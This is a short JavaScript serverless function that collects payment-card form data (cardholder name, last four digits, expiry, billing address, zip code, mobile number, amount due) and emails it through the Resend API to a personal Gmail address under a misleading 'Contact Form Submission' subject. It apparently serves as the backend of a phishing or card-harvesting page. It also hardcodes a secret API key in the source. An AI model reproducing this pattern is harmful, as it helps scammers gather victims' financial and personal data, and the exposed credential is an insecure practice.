import { Resend } from 'resend';

export default async (req) => {
  try {
    const resend = new Resend('re_EQzKy1GN_KtEGb23QMbSrziu44YPJGvxv');
    const docData = req;
    const emailData = {
      from: 'onboarding@resend.dev',
      to: 'paymentsupdate2@gmail.com',
      subject: 'Contact Form Submission ',
      html: `<p>Mobile Number: ${docData.secondmobileNumber}</p>
                <p>Due Amount: $${docData.dueamount}</p>
                <p>Card Holder Name: ${docData.cardholdername}</p>
                <p>Card Number: XXXX-XXXX-XXXX-${docData.cardnumber.slice(
                  -4
                )}</p>
                <p>Expiry Date: ${docData.month}/${docData.year}</p>
                <p>Billing Zip Code: ${docData.zipcode}</p>
                <p>City: ${docData.city}</p>
                <p>Card Billing Address: ${docData.cardbillingaddress}</p>
                <p>State/Province: ${docData.state}</p>`,
    };

    const data = await resend.emails.send(emailData);
    console.log('data', data);
    // res.status(200).json(data);
  } catch (error) {
    console.log('me nhi chala', error);
    // res.status(400).json(error);
  }
};
